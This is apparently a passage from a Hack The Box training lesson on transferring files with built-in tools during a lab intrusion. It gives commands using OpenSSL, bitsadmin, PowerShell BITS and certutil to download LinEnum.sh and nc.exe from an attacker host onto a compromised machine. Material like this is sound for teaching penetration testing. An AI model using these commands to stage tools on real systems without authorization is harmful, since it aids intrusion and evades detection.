To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.

Let's use [OpenSSL](https://www.openssl.org/). It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

We need to create a certificate and start a server in our Pwnbox.

#### Create Certificate in our Pwnbox

  Create Certificate in our Pwnbox

```shell-session
gdxqpardo@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

#### Stand up the Server in our Pwnbox

  Stand up the Server in our Pwnbox

```shell-session
gdxqpardo@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Next, with the server running, we need to download the file from the compromised machine.

#### Download File from the Compromised Machine

  Download File from the Compromised Machine

```shell-session
gdxqpardo@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```



#### Other Common Living off the Land Tools

**BitsAdmin Download Function**
The [background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)
cna be used to download files from http sites and SMB shares. it 'intelligently' checks host and network utilization into account to minimize the impact on a users foreground work

#### File Download with Bitsadmin

  File Download with Bitsadmin

```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.

#### Download

  Download

```powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil

Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.

#### Download a File with Certutil

  Download a File with Certutil

```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```









































































































